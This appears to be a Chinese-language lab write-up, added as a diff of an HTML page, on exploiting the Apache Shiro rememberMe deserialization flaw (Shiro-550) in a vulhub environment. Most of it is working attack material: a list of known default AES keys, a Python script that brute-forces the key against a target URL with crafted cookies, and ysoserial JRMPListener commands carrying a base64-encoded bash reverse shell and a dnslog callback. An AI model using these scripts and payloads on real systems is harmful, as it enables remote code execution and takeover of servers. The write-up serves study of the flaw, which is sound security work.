@@ -1,0 +1,138 @@
+<h1 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多。</p>
+<h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>kali-2021 攻击机 192.168.8.9</p>
+<p>docker vulhub 192.168.8.6</p>
+<p>vulhub</p>
+<p>cd &#x2F;vulhub&#x2F;shiro&#x2F;CVE-2016-4437</p>
+<p>docker-compose up -d</p>
+<h2 id="三、漏洞原理"><a href="#三、漏洞原理" class="headerlink" title="三、漏洞原理"></a>三、漏洞原理</h2><p> Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
+<p>‍</p>
+<p>1.首先正常登录，然后生成带有rememberme的返回cookie值。</p>
+<p>2.生成cookie，shiro会提供rememberme功能，可以通过cookie记录登录用户，从而记录登录用户的身份认证信息，即下次无需登录即可访问。处理rememberme的cookie的类为org.apache.shiro.web.mgt.CookieRememberMeManager</p>
+<p>3.之后进入serialize，对登录认证信息进行序列化</p>
+<p>4.然后加密，调用aes算法。</p>
+<p>5.加密结束，然后在在org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.java的rememberSerializedIdentity方法中进行base64编码，并通过response返回</p>
+<p>6.解析cookie</p>
+<p>7.先解密在反序列化</p>
+<p>8.AES是对称加密，加解密密钥都是相同的，并且shiro都是将密钥硬编码</p>
+<p>9.调用crypt方法利用密文，key，iv进行解密,解密完成后进入反序列化，看上面的public AbstractRememberMeManager这里用的是默认反序列化类,然后触发生成反序列化。</p>
+<p>Shiro 1.2.4版本默认固定密钥：</p>
+<p>​<img src="/assets/image-20231022163553-92edk5o.png" alt="image">​</p>
+<p><strong>Shiro框架默认指纹特征：</strong></p>
+<p>1.未登陆的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段</p>
+<p>2.登陆失败的话，不管勾选RememberMe字段没有，返回包都会有rememberMe&#x3D;deleteMe字段</p>
+<p>3.不勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段。但是之后的所有请求中Cookie都不会有rememberMe字段</p>
+<p>4.勾选RememberMe字段，登陆成功的话，返回包set-Cookie会有rememberMe&#x3D;deleteMe字段，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。</p>
+<h2 id="四、AES秘钥"><a href="#四、AES秘钥" class="headerlink" title="四、AES秘钥"></a>四、AES秘钥</h2><p> 在Shiro 1.2.4以及之前的版本中AES加密的秘钥都是默认的编码在代码里的（SHIRO-550），1.2.4以上移除了默认秘钥，需要开发者设置或者默认动态生成，降低了秘钥泄露的风险。</p>
+<p> 但是一些开源的项目内部集成了shiro的二次开发，可能会有低版本shiro的默认秘钥的风险，一些用户搭建环境时会使用网上的教程来快速搭建，直接复制了网上的秘钥，从而造成了秘钥的泄密，引发了反序列化漏洞。</p>
+<p>可以在github上使用命令</p>
+<p>“securityManager.setRememberMeManager(rememberMeManager);Base64.decode(“<br>或<br>“setCipherKey(Base64.decode(”  </p>
+<p><strong>1、判断AES秘钥</strong><br> 密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe&#x3D;deleteMe字段，</p>
+<p> 而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe&#x3D;deleteMe字段</p>
+<p> shiro在1.4.2版本之前， AES的模式为CBC， IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。</p>
+<p>在1.4.2版本后，shiro已经更换加密模式 AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p>
+<p>‍</p>
+<p>CBC算法的shiro生成payload的关键代码如下，也就是我们通用的生成shiro攻击代码</p>
+<p> python中有实现aes-cbc的算法，通过指定mode为AES-CBC，遍历key，随机生成iv，配合ysoserial的gadget即可生成payload</p>
+<pre><code class="python">BS   = AES.block_size
+pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+mode =  AES.MODE_CBC
+iv   =  uuid.uuid4().bytes
+file_body = pad(file_body)
+encryptor = AES.new(base64.b64decode(key), mode, iv)
+base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+return base64_ciphertext
+</code></pre>
+<p> 而在1.4.2以后由于padding oracle的影响，shiro官方把加密方式改为了GCM，所以我们需要更改脚本，添加GCM下的攻击方式去攻击高版本的shiro，通过跟踪代码动态调试可以看出确实是使用GCM加密</p>
+<p> 所以shiro的攻击脚本中的核心代码我们来修改一下,GCM加密不需要padding，但需要一个MAC值(也就是我代码里的tag)，这块可以自己跟一下源码，核心代码如下：</p>
+<pre><code class="python">iv = os.urandom(16)
+cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)
+ciphertext, tag = cipher.encrypt_and_digest(file_body)
+ciphertext = ciphertext + tag
+base64_ciphertext = base64.b64encode(iv + ciphertext)
+return base64_ciphertext
+</code></pre>
+<p> 密钥集合我这里简单列举了几个，网上流传大量现成的 Shiro 100 Key(<a href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA">https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a>)</p>
+<p>集合，请自行查找替换。密钥判断脚本如下：</p>
+<p>输入目标的url，通过判断返回包是否存在Set-Cookie：rememberMe&#x3D;deleteMe来判断秘钥是否正确</p>
+<pre><code class="python">import base64
+import uuid
+import sys
+import requests
+from Crypto.Cipher import AES
+
+def encrypt_AES_GCM(msg, secretKey):
+    aesCipher = AES.new(secretKey, AES.MODE_GCM)
+    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
+    return (ciphertext, aesCipher.nonce, authTag)
+
+def encode_rememberme(target):
+    keys = [&#39;kPH+bIxk5D2deZiIxcaaaA==&#39;, &#39;4AvVhmFLUs0KTA3Kprsdag==&#39;,&#39;66v1O8keKNV3TTcGPK1wzg==&#39;, &#39;SDKOLKn2J1j/2BHjeZwAoQ==&#39;] 		# 此处简单列举几个密钥
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    mode = AES.MODE_CBC
+    iv = uuid.uuid4().bytes
+
+    file_body = base64.b64decode(&#39;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#39;)
+    for key in keys:
+        try:
+            # CBC加密
+            encryptor = AES.new(base64.b64decode(key), mode, iv)
+            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
+            res = requests.get(target, cookies={&#39;rememberMe&#39;: base64_ciphertext.decode()},timeout=3,verify=False, allow_redirects=False)
+            if res.headers.get(&quot;Set-Cookie&quot;) == None:
+                print(&quot;good KEY : &quot; + key)
+                return key
+            else:
+                if &#39;rememberMe=deleteMe;&#39; not in res.headers.get(&quot;Set-Cookie&quot;):
+                    print(&quot;good key:&quot; + key)
+                    return key
+            # GCM加密
+            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
+            base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
+            res = requests.get(target, cookies={&#39;rememberMe&#39;: base64_ciphertext.decode()}, timeout=3, verify=False, allow_redirects=False)
+
+            if res.headers.get(&quot;Set-Cookie&quot;) == None:
+                print(&quot;good KEY:&quot; + key)
+                return key
+            else:
+                if &#39;rememberMe=deleteMe;&#39; not in res.headers.get(&quot;Set-Cookie&quot;):
+                    print(&quot;good key:&quot; + key)
+                    return key
+            print(&quot;good key:&quot; + key)
+            return key
+        except Exception as e:
+            print(e)
+if __name__ == &#39;__main__&#39;:
+    encode_rememberme(sys.argv[1])
+</code></pre>
+<h2 id="五、Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#五、Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="五、Shiro rememberMe反序列化漏洞（Shiro-550）"></a>五、Shiro rememberMe反序列化漏洞（Shiro-550）</h2><h4 id="1、版本1-4-2之前"><a href="#1、版本1-4-2之前" class="headerlink" title="1、版本1.4.2之前"></a>1、版本1.4.2之前</h4><p>该版本漏洞利用<br> 第一步：启动靶机后，访问URL通过burp抓包，判断环境存在shiro，查看返回包中Set-Cookie中是否存在</p>
+<p> 第二步：打开公网vps，执行如下命令：（注意这里监听的端口为1099），并执行反弹shell的命令</p>
+<p>‍</p>
+<p>配置maven</p>
+<pre><code class="bash">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz
+tar -zxvf apache-maven-3.6.3-bin.tar.gz
+sudo mv apache-maven-3.6.3 /usr/local/maven3
+vim /etc/profile   末尾添加maven环境变量:
+export M2_HOME=/usr/local/maven3
+export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/bin
+source /etc/profile
+</code></pre>
+<p>下载ysoserial并打包</p>
+<pre><code class="bash">git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package -D skipTests
+</code></pre>
+<pre><code class="bash">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 &quot;反弹 shell 的命令&quot;
+</code></pre>
+<p>这里的命令需要使用Java Runtime配置bash编码。<br>在线编码转换地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br>转换命令如下：<strong>（这里是反弹shell的端口为1234）</strong></p>
+<pre><code class="bash">
+bash -i &gt;&amp; /dev/tcp/192.168.8.9/1234 0&gt;&amp;1
+
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEwMS8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}
+</code></pre>
+<p>第三步：最终在VPS上执行的命令如下：</p>
+<pre><code class="bash">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEwMS8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}&quot;
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;ping e78g5l.dnslog.cn&quot;
+</code></pre>
+<p>​<img src="/assets/image-20231022170333-j05nxsr.png" alt="image">​</p>
+<p>‍</p>
